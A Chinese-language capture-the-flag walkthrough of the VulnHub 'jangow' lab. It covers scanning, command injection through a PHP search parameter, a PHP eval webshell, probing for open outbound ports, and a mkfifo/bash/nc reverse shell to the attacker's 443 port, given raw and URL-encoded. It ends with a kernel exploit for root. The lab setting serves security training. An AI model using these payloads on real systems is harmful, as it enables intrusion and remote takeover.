# 前言

靶机：`jangow`，IP地址为`192.168.10.9`

攻击：`kali`，IP地址为`192.168.10.2`

都采用虚拟机，网卡为桥接模式

该靶机目前只剩下一个了，之前记得是有两台构成系列的。

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过下方链接下载

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\2.jpg)

## 网站信息探测

访问80端口网站，发现有目录`site`，点击后，出现界面，这个界面真挺好看的

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\3.jpg)

查看页面源代码，发现一个`php`界面，并且参数都有了

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\4.jpg)

使用多款目录爆破工具，使用`dirsearch`，默认字典，发现隐藏文件，当然这里也可以设置其递归爆破，只是这样速度可能会稍慢

```shell
dirsearch -u http://192.168.10.9 -x 403,404 -e js
```

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\5.jpg)

使用`girb`进行扫描，默认字典，发现`wordpress`

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\6.jpg)

打开隐藏文件`/backup`，发现连接数据库的相关信息

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\7.jpg)

用户名`jangow01`，密码`abygurl69`

尝试打开`wordpress`，发现并非`cms`，只是目录名称为这个，其内容就是`site`中的默认界面内容

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\8.jpg)

# 漏洞利用

测试之前有的`php`文件，参数已经给出，测试有无注入点，如路径遍历等

这里可以使用`ffuf`或者`burp`等其他工具，执行发现一个可用语句

```shell
ffuf -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://192.168.10.9/site/busque.php?buscar=FUZZ -fs 1
#-fs 1 是把原本界面大小1，直接过滤掉
```

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\9.jpg)

```shell
http://192.168.10.9/site/busque.php?buscar=%0a/bin/cat%20/etc/passwd
```

复制这个语句，通过浏览器访问，发现一个用户，也就是前面隐藏文件中的用户名`jangow01`和密码`abygurl69`

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\10.jpg)

而且，可以看到这里是通过调用`cat`来查看的，是否表示这里可以进行命令执行，直接更换为`ls`，测试发现，成了！

```shell
http://192.168.10.9/site/busque.php?buscar=%0a/bin/ls
```

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\11.jpg)

查看后，发现其代码调用`system`函数

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\12.jpg)

这里虽然可以进行很多，不过既然给出了`ftp`，总要用一下，以上面获取的用户名和密码进行登录，如果存在这样的情况。用户名`jangow01`，密码`abygurl69`

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\13.jpg)

发现这就是网站的一些文件，可以从这里查看，前面的都差不多发现了，在`wordpress`处发现一个`config.php`文件，是连接数据库的

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\14.jpg)

用户名`desafio02`和密码`abygurl69`，这里打算再以这个凭证登录的，发现失败

# 反弹shell

那么回到网站上，尝试通过`php`文件获取一个反弹`shell`，不过在构造多条语句无果后，我测试了一下网络连通，发现`kali`可以连通靶机，但是反过来不行，导致流量无法出来。可能是这个`php`文件中还有其他的限制等情况

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\15.jpg)

![16](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\16.jpg)

这个流量没出去，不过既然命令可执行，就尝试在本地直接写一个`php`文件，然后再测试

写入是可以的，不过还是不能直接反弹`shell`，则，再写`sh`脚本，也是不行，这个肯定是防火墙之类的端口限制了，需要找到某个端口可以进行流量发送的，之前`nmap`扫描到的`21`和`80`端口试试

也可能是`system`的问题，尝试写入一个新的

```php
<?php @eval($_REQUEST['cmd']);?>
```

在浏览器输入

```shell
busque.php?buscar=echo '<?php @eval($_GET['cmd']);?>' > shell.php
```

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\17.jpg)

## webshell

尝试使用蚁剑等工具进行连接，发现成功，说明可以连接，只是进行端口限制，至于是哪个端口，需要进一步验证

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\18.jpg)

也就是这里不仅是端口，还有函数也进行了限制，现在连接蚁剑的虚拟终端，查看`flag`

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\19.jpg)

测试使用`nc`进行反弹，发现`-e`参数无法使用，并且还是端口问题，无法发出流量

尝试使用`nc`进行测试，也就是在靶机内去连接`kali`中的一些端口进行测试，因为这里`kali`是能连通靶机，主要是靶机连接`kali`的问题

## 测试端口情况

这里以一些常用端口进行测试，如`21,22,23,53,80,111,443`等等，当然也可以进行全端口的测试，只是等待时间有点太长了，这毕竟是打靶，知道方法即可

```shell
nc -zv -w20 192.168.10.2 21 22 23 25 53 80 110 111 135 139 143 443 445 3389 8080 >>result 2>&1
```

执行后，查看`result`，发现有一个端口可能存在连接，因为这里明确说明是拒绝连接，至少说明有流量产生

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\20.jpg)

尝试测试这个端口能否把流量发送到`kali`，也就是测试能否通过这个端口进行通信

在`kali`使用`python`开启一个`http`服务，定位在`443`端口

测试，确定在`443`端口是可以的，其他端口使用`wget`都是无法通信的状态

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\21.jpg)

那么也就是，在靶机内，只要请求的外部资源是`443`端口的，就可以产生通信，也就是外部返回必须是`443`端口。

尝试在`kali`监听443端口，然后在靶机请求`kali`的443端口

因为之前测试，在蚁剑中是无法调用`sh`和`nc -e`的，那么可以通过写文件脚本，或者利用之前的命令执行链接进行反弹测试

## 获取反弹shell

比如这里在可访问的网站目录下，创建一个`php`脚本`ff.php`，然后在文件写入下面代码，为什么呢，因为测试多个，都没有反应

```shell
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.10.2 443 >/tmp/f');?>
```

这时候，再通过浏览器访问这个脚本，以触发，即可反弹

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\22.jpg)

或者在之前默认的命令执行处，把上面的反弹`shell`代码进行一个编码处理，然后通过浏览器传参执行，也是可以的

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.10.2 443 >/tmp/f

#url编码处理
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.10.2%20443%20%3E%2Ftmp%2Ff
```

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\23.jpg)

# 提权

获取到第一个`flag`

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\24.jpg)



使用`find`寻找具有SUID权限文件，发现`sudo`，测试发现并不可用

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\25.jpg)

查看靶机内用户，发现和之前查看`/etc/passwd`一样，只要`jangow01`，使用`su`切换后，使用上面的密码`abygurl69`，登录成功，不过就是执行`sudo`还是无权，寻找其他方式

查看操作系统信息及内核

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\26.jpg)

使用`searchsploit`搜索有无内核漏洞，发现几个，不过经过测试，可用的只有这个

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\27.jpg)

查看该文件，其中有用法，以及测试主机

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\28.jpg)

在靶机中使用`gcc -v`发现可以使用`gcc`命令，那么通过端口复用，把文件下载到靶机，也就是443端口复用，其余端口进行限制，不过这里还没权限知道规则

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\29.jpg)

编译文件后，给予执行权限，然后直接运行

```shell
gcc 45010.c -o exp
chmod +x exp
./exp
```

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\30.jpg)

切换`/root`目录，查看最后的文件

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\31.jpg)

使用`iptables -L`简单看一下拦截情况

![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\32.jpg)

# 总结

该靶机主要考察以下几点：

1. 对于目录型网站，可能存在隐藏文件，能否爆破出，`windows`和`linux`对于隐藏文件的名称是不一样的
2. 对于连接数据库的文件，能否找到，并看懂
3. 对于`php`文件，可能有的传参是具有注入点的，都要进行测试
4. 对于反弹`shell`时，发现突然一下不能获取`shell`，但是浏览器看到一直在执行的话。要知道学会排查，获取一个个测试，直到有成功的。
5. 考察`webshell`的使用，这里通过`webshell`以达到可以写入文件等的便捷操作，并且大部分时候，能够获取`webshell`会真的方便一些。
6. 可以借助`nc`等靶机内有的一些扫描工具进行测试，因为有的从外面扫描是可以的，但是那是进站，对于内网的出站可能又是一个不一样的规则































